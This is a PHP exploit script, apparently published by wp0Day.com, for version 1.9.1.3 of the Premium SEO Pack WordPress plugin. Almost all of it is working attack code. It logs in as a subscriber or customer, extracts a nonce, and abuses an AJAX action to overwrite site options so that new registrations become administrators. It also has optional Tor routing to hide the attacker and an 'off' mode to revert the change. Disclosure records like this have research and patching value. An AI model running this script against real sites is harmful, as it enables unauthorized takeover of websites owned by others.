<?php
/**
 * Exploit Title: Premium SEO Pack Exploit
 * Google Dork:
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Vendor Homepage: http://aa-team.com/
 * Software Link: http://codecanyon.net/item/premium-seo-pack-wordpress-plugin/6109437?s_rank=2
 * Version: 1.9.1.3
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: Authenticated (customer, subscriber) wp_options overwrite
 * Time line: Found [05-Jun-2016], Vendor notified [05-Jun-2016], Vendor fixed: [???], [RD:1]
 */


require_once('curl.php');
//OR
//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
$curl = new CurlWrapper();


$options = getopt("t:m:u:p:a:",array('tor:'));
echo "Current Options:\n";
print_r($options);
for($i=4;$i>0;$i--){
    echo "Starting in $i \r";
    sleep(1);
}
echo "Starting....         \r";
echo "\n";

$options = validateInput($options);

if (!$options){
    showHelp();
}

if ($options['tor'] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get('https://dynamicdns.park-your-domain.com/getip');
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != 'wololo'){
        die("Aborting!\n");
    }
    echo "OK...\n";
}


function logIn(){
    global $curl, $options;
    file_put_contents('cookies.txt',"\n");
    $curl->setCookieFile('cookies.txt');
    $curl->get($options['t']);
    $data = array('log'=>$options['u'], 'pwd'=>$options['p'], 'redirect_to'=>$options['t'], 'wp-submit'=>'Log In');
    $curl->post($options['t'].'/wp-login.php', $data);
    $status =  $curl->getTransferInfo('http_code');
    if ($status !== 302){
        echo "Login probably failed, aborting...\n";
        echo "Login response saved to login.html.\n";
        die();
    }
    file_put_contents('login.html',$curl->getResponse());
}

function exploit(){
    global $curl, $options;
    if ($options['m'] == 'admin_on') {
        echo "Setting default role on registration to Administrator\n";
        /* Getting a nonce */
        $data = array('action'=>'pspLoadSection', 'section'=>'setup_backup');
        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
        $resp = $curl->getResponse();
        $resp = json_decode($resp,true);
        preg_match_all('~id="box_nonce" name="box_nonce" value="([a-f0-9]{10})"~', $resp['html'], $mat);
        if (!isset($mat[1])){
            die("Failed getting box_nonce\n");
        }
        $nonce = $mat[1][0];
        $new_settings = array('default_role'=>'administrator', 'users_can_register'=>1);
        $new_settings = urlencode(json_encode($new_settings));
        echo "Sending settings to update\n";
        $data = array('action'=>'pspInstallDefaultOptions', 'options'=>'box_id=psp_setup_box&box_nonce='.$nonce.'&install_box='.$new_settings);
        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
        $resp = $curl->getResponse();
        $resp = json_decode($resp,true);
        if (@$resp['status'] == 'ok'){
            echo "Admin mode is ON, go ahead an register yourself an Admin account! \n";
        } else {
            echo "Setting admin mode failed \n";
        }
        echo "Raw response: " . $curl->getResponse() . "\n";
    }
    if ($options['m'] == 'admin_off') {

        echo "Setting default role on registration to Subscriber\n";
        /* Getting a nonce */
        $data = array('action'=>'pspLoadSection', 'section'=>'setup_backup');
        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
        $resp = $curl->getResponse();
        $resp = json_decode($resp,true);
        preg_match_all('~id="box_nonce" name="box_nonce" value="([a-f0-9]{10})"~', $resp['html'], $mat);
        if (!isset($mat[1])){
            die("Failed getting box_nonce\n");
        }
        $nonce = $mat[1][0];
        $new_settings = array('default_role'=>'subscriber', 'users_can_register'=>0);
        $new_settings = urlencode(json_encode($new_settings));
        echo "Sending settings to update\n";
        $data = array('action'=>'pspInstallDefaultOptions', 'options'=>'box_id=psp_setup_box&box_nonce='.$nonce.'&install_box='.$new_settings);
        $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
        $resp = $curl->getResponse();
        $resp = json_decode($resp,true);
        if (@$resp['status'] == 'ok'){
            echo "Admin mode is OFF \n";
        }
        echo "Raw response: " . $curl->getResponse() . "\n";
    }
}


logIn();
exploit();



function validateInput($options){

    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
        return false;
    }
    if ( !isset($options['u']) ){
        return false;
    }
    if ( !isset($options['p']) ){
        return false;
    }
    if (!preg_match('~/$~',$options['t'])){
        $options['t'] = $options['t'].'/';
    }
    if (!isset($options['m']) || !in_array($options['m'], array('admin_on','admin_off') ) ){
        return false;
    }
    if ($options['m'] == 'tag' && !isset($options['a'])){

    }
    $options['tor'] = isset($options['tor']);

    return $options;
}


function showHelp(){
    global $argv;
    $help = <<<EOD

    Premium SEO Pack Exploit

Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USERNAME] -p [PASSWORD] -m [MODE]

       *** You need to have a valid login (customer or subscriber will do) in order to use this "exploit" **

       [MODE] admin_on  - Sets default role on registration to Administrator
              admin_off - Sets default role on registration to Subscriber

Examples:
       php $argv[0] -t http://localhost/ --tor=yes -u customer1 -p password -m admin_on
       php $argv[0] -t http://localhost/ --tor=yes -u customer1 -p password -m admin_off

    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License

EOD;
    echo $help."\n\n";
    die();
}
